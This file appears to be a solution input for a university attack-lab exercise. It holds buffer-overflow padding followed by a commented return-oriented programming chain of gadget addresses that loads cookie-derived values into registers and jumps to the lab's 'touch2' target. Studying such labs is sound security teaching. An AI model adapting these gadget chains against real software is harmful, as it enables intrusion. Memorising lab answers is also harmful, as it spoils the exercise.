00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00

00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00

00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00

26 19 40 00 00 00 00 00 /* pop rax */
35 59 23 43 00 00 00 00 /* cookie + dead */
66 19 40 00 00 00 00 00 /* rax to rdi */
3a 19 40 00 00 00 00 00 /* rdi to rdx */
05 19 40 00 00 00 00 00 /* rdx to rsi */

26 19 40 00 00 00 00 00 /* pop rax */
24 18 24 43 00 00 00 00 /* cookie + dead + beef */
66 19 40 00 00 00 00 00 /* rax to rdi */
3a 19 40 00 00 00 00 00 /* rdi to rdx */

26 19 40 00 00 00 00 00 /* pop rax */
88 7a 22 43 00 00 00 00 /* cookie */
66 19 40 00 00 00 00 00 /* rax to rdi */

fd 15 40 00 00 00 00 00 /* touch2 */
